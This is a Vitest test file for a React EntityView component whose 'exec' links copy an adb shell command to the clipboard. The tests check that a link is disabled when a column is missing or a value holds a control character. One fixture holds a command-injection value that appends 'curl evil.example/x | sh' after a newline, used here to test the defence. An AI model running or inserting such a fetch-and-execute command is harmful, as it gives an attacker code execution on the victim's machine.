import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { act, createElement } from 'react';
import { createRoot, type Root } from 'react-dom/client';
import EntityView from './EntityView';
import { api } from '../api/client';
import { readParam } from '../urlState';
import type { EntityInfo } from '../api/types';

// A `kind: exec` entity link renders one button per row, same as a `kind: url` link, but
// clicking it copies the assembled local CLI command to the clipboard instead of navigating —
// no HTTP request is made to resolve or execute it. A row that can't produce a safe/complete
// command (missing template column, a control character in the resolved command) renders the
// button disabled instead.

const ENTITIES: EntityInfo[] = [
  {
    name: 'widgets',
    id: 'widget_token',
    links: [
      {
        label: 'Open on Android',
        template: 'myapp://widget/{{widget_token}}',
        kind: 'exec',
        steps: [['adb', 'shell', 'am', 'start', '-a', 'android.intent.action.VIEW', '-d', '{{url}}']],
      },
    ],
  },
];

describe('EntityView: kind: exec links', () => {
  let container: HTMLDivElement;
  let root: Root;

  beforeEach(() => {
    container = document.createElement('div');
    document.body.appendChild(container);
    vi.spyOn(api, 'entities').mockResolvedValue(ENTITIES);
    Object.defineProperty(navigator, 'clipboard', {
      value: { writeText: vi.fn().mockResolvedValue(undefined) },
      configurable: true,
    });
  });

  afterEach(() => {
    act(() => root.unmount());
    container.remove();
    vi.restoreAllMocks();
    window.history.replaceState(null, '', '/');
  });

  async function renderWithRow(row: Record<string, unknown>) {
    vi.spyOn(api, 'entityList').mockResolvedValue([row]);
    window.history.replaceState(null, '', '/?entity=widgets');
    root = createRoot(container);
    await act(async () => {
      root.render(createElement(EntityView));
    });
  }

  it('copies the assembled command to the clipboard and does not navigate or open the row', async () => {
    await renderWithRow({ widget_token: 'abc123' });

    const btn = container.querySelector('.entity-table__link-btn') as HTMLButtonElement;
    expect(btn, 'expected an exec link button').toBeTruthy();
    expect(btn.disabled).toBe(false);
    expect(btn.title).toBe("adb shell am start -a android.intent.action.VIEW -d 'myapp://widget/abc123'");

    await act(async () => {
      btn.click();
      await Promise.resolve();
    });

    expect(navigator.clipboard.writeText).toHaveBeenCalledWith(
      "adb shell am start -a android.intent.action.VIEW -d 'myapp://widget/abc123'",
    );
    expect(readParam('id'), 'clicking the exec link must not open the row').toBeNull();
  });

  it('shows a "copied" toast after a successful copy', async () => {
    await renderWithRow({ widget_token: 'abc123' });
    const btn = container.querySelector('.entity-table__link-btn') as HTMLButtonElement;

    await act(async () => {
      btn.click();
      await Promise.resolve();
    });

    expect(btn.parentElement?.textContent).toContain('copied');
  });

  it('renders the button disabled, with a reason, when the template references a missing column', async () => {
    await renderWithRow({});

    const btn = container.querySelector('.entity-table__link-btn') as HTMLButtonElement;
    expect(btn.disabled).toBe(true);
    expect(btn.title).toBe('row is missing "widget_token"');

    await act(async () => {
      btn.click();
    });
    expect(navigator.clipboard.writeText).not.toHaveBeenCalled();
  });

  it('renders the button disabled when the resolved command would contain a control character', async () => {
    await renderWithRow({ widget_token: 'abc\ncurl evil.example/x | sh' });

    const btn = container.querySelector('.entity-table__link-btn') as HTMLButtonElement;
    expect(btn.disabled).toBe(true);
    expect(btn.title).toBe('row value contains a control character');
  });
});
